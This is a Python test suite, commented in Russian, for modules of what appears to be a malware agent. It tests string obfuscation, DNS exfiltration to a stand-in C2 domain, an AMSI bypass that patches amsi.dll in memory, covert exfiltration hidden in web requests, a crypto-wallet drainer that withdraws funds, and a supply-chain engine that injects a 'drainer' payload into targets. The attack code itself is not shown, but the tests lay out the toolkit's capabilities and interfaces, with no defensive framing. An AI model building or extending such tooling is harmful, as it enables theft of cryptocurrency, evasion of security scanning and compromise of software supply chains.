#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Тесты для модуля продвинутых техник обхода защиты (advanced_evasion.py)
"""

import unittest
import os
import sys
import socket
import platform
import tempfile
import shutil
import json
import logging
from unittest.mock import patch, MagicMock
from agent_modules.crypto_stealer import WalletDrainer
from agent_modules.supply_chain_infection import SupplyChainInfectionEngine

# Настраиваем логирование
logging.basicConfig(level=logging.DEBUG)

# Импортируем модуль для тестирования
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from agent_modules.advanced_evasion import AdvancedEvasion


class TestAdvancedEvasion(unittest.TestCase):
    """Тесты для модуля AdvancedEvasion"""
    
    def setUp(self):
        """Подготовка к тестам"""
        self.evasion = AdvancedEvasion(log_actions=True)
        self.test_dir = tempfile.mkdtemp()
        
    def tearDown(self):
        """Очистка после тестов"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def test_initialization(self):
        """Тест инициализации модуля"""
        self.assertEqual(self.evasion.os_type, platform.system().lower())
        self.assertIsNotNone(self.evasion.string_xor_key)
        self.assertTrue(len(self.evasion.string_xor_key) == 16)
        self.assertTrue(isinstance(self.evasion.action_log, list))
    
    def test_string_obfuscation(self):
        """Тест обфускации строк"""
        test_strings = [
            "whoami", 
            "ls -la", 
            "netstat -an",
            "system_info",
            "ThisIsAVeryLongStringForTestingPurposesOnly"
        ]
        
        for test_str in test_strings:
            obfuscated = self.evasion.obfuscate_string(test_str)
            deobfuscated = self.evasion.deobfuscate_string(obfuscated)
            
            # Проверяем, что обфусцированная строка отличается от исходной
            self.assertNotEqual(test_str, obfuscated)
            
            # Проверяем, что деобфусцированная строка соответствует исходной
            self.assertEqual(test_str, deobfuscated)
            
            # Проверяем, что обфусцированная строка содержит hex-последовательности
            self.assertTrue(obfuscated.startswith("\\x"))
    
    @patch('socket.gethostbyname')
    def test_dns_exfiltration(self, mock_gethostbyname):
        """Тест DNS exfiltration с мок-объектами"""
        mock_gethostbyname.side_effect = socket.gaierror  # Ожидаемая ошибка
        
        test_data = "Тестовые данные для DNS exfiltration"
        test_domain = "test-c2.example.com"
        
        result = self.evasion.dns_exfiltrate(test_data, domain=test_domain)
        
        # Проверяем возвращаемое значение
        self.assertTrue("Данные отправлены через DNS" in result)
        
        # Проверяем, что метод gethostbyname был вызван
        self.assertTrue(mock_gethostbyname.called)
        
        # Проверяем лог действий
        self.assertTrue(any("dns_exfiltrate" in entry.get("type", "") for entry in self.evasion.action_log))
    
    @unittest.skipIf(platform.system().lower() != "windows", "Тест только для Windows")
    def test_windows_amsi_bypass(self):
        """Тест обхода AMSI (только для Windows)"""
        with patch('ctypes.WinDLL') as mock_windll, \
             patch('ctypes.c_void_p.in_dll') as mock_in_dll, \
             patch('ctypes.windll.kernel32.VirtualProtect') as mock_virtualprotect, \
             patch('ctypes.memmove') as mock_memmove:
            
            # Настройка мок-объектов
            mock_windll.return_value = MagicMock()
            mock_in_dll.return_value = MagicMock()
            mock_virtualprotect.return_value = True
            
            result = self.evasion.amsi_bypass()
            
            # Проверяем результат
            self.assertEqual(result, "AMSI bypass успешно применен")
            
            # Проверяем, что нужные методы были вызваны
            mock_windll.assert_called_once_with("amsi.dll")
            mock_virtualprotect.assert_called()
            mock_memmove.assert_called_once()
    
    @unittest.skipIf(not hasattr(unittest.TestCase, 'assertLogs'), "Python < 3.4 не поддерживает assertLogs")
    def test_logging(self):
        """Тест журналирования действий"""
        with self.assertLogs('advanced_evasion', level='DEBUG') as cm:
            self.evasion.obfuscate_string("test_logging")
            
        # Проверяем, что было как минимум одно сообщение DEBUG
        self.assertTrue(any('DEBUG' in log for log in cm.output))
        
        # Проверяем, что есть запись в журнале действий
        self.assertGreater(len(self.evasion.action_log), 0)
        
        # Отключаем логирование и проверяем, что записи больше не добавляются
        old_log_size = len(self.evasion.action_log)
        self.evasion.log_actions = False
        self.evasion.obfuscate_string("without_logging")
        self.assertEqual(len(self.evasion.action_log), old_log_size)
    
    @patch('requests.get')
    def test_polymorphic_exfil(self, mock_get):
        """Тест полиморфной стеганографии"""
        # Настраиваем мок для requests.get
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_get.return_value = mock_response
        
        # Добавляем мок для HAS_REQUESTS
        # Получаем модуль напрямую
        module_name = self.evasion.__module__
        module = sys.modules[module_name]
        original_has_requests = getattr(module, 'HAS_REQUESTS', False)
        setattr(module, 'HAS_REQUESTS', True)
        
        try:
            test_data = "Секретные данные для передачи через стеганографию"
            result = self.evasion.polymorphic_exfil(test_data)
            
            # Проверяем результат
            self.assertTrue("Данные успешно экспортированы" in result)
            
            # Проверяем, что был вызван requests.get с правильными параметрами
            mock_get.assert_called_once()
            call_args = mock_get.call_args[1]
            
            # Проверяем структуру заголовков и параметров
            self.assertIn('headers', call_args)
            self.assertIn('params', call_args)
            headers = call_args['headers']
            params = call_args['params']
            
            # Проверяем наличие нужных заголовков
            self.assertIn('User-Agent', headers)
            self.assertIn('Accept', headers)
            self.assertIn('Cookie', headers)
            
            # Проверяем наличие нужных параметров
            self.assertIn('search', params)
            self.assertIn('category', params)
        finally:
            # Восстанавливаем оригинальное значение HAS_REQUESTS
            setattr(module, 'HAS_REQUESTS', original_has_requests)
    
    def test_get_status(self):
        """Тест получения статуса модуля"""
        status = self.evasion.get_status()
        
        # Проверяем наличие ключевых полей
        self.assertIn('os', status)
        self.assertIn('is_admin', status)
        self.assertIn('action_count', status)
        self.assertIn('ctypes_available', status)
        self.assertIn('requests_available', status)
        
        # Проверяем типы данных
        self.assertIsInstance(status['os'], str)
        self.assertIsInstance(status['is_admin'], bool)
        self.assertIsInstance(status['action_count'], int)
        
        # Проверяем, что счетчик действий соответствует размеру журнала
        self.assertEqual(status['action_count'], len(self.evasion.action_log))


class TestWalletDrainer(unittest.TestCase):
    def setUp(self):
        self.output_dir = "/tmp/test_wallet_drainer"
        os.makedirs(self.output_dir, exist_ok=True)
        self.drainer = WalletDrainer(output_dir=self.output_dir, c2_url=None)

    def test_run_and_report(self):
        result = self.drainer.run()
        self.assertEqual(result["status"], "success")
        self.assertIn("wallets", result)
        self.assertIn("wallet_drainer_report", result)
        # Проверяем, что отчет создан
        report_path = result["wallet_drainer_report"]
        self.assertTrue(os.path.exists(report_path))
        with open(report_path) as f:
            report = json.load(f)
        self.assertIn("wallets", report)
        self.assertIn("withdraw_results", report)

    def tearDown(self):
        # Чистим тестовые файлы
        import shutil
        shutil.rmtree(self.output_dir, ignore_errors=True)


class TestSupplyChainInfectionEngine(unittest.TestCase):
    def setUp(self):
        self.output_dir = "/tmp/test_supply_chain"
        os.makedirs(self.output_dir, exist_ok=True)
        self.engine = SupplyChainInfectionEngine(output_dir=self.output_dir)

    def test_scan_targets(self):
        targets = self.engine.scan_targets()
        self.assertTrue(len(targets) > 0)
        self.assertIn("type", targets[0])

    def test_inject_payload(self):
        targets = self.engine.scan_targets()
        result = self.engine.inject_payload(targets[0], payload_type="drainer")
        self.assertEqual(result["status"], "success")
        self.assertEqual(result["payload"], "drainer")

    def test_run_and_report(self):
        report = self.engine.run()
        self.assertEqual(report["status"], "success")
        self.assertIn("infection_results", report)
        self.assertTrue(os.path.exists(self.output_dir))

    def tearDown(self):
        import shutil
        shutil.rmtree(self.output_dir, ignore_errors=True)


if __name__ == '__main__':
    unittest.main() 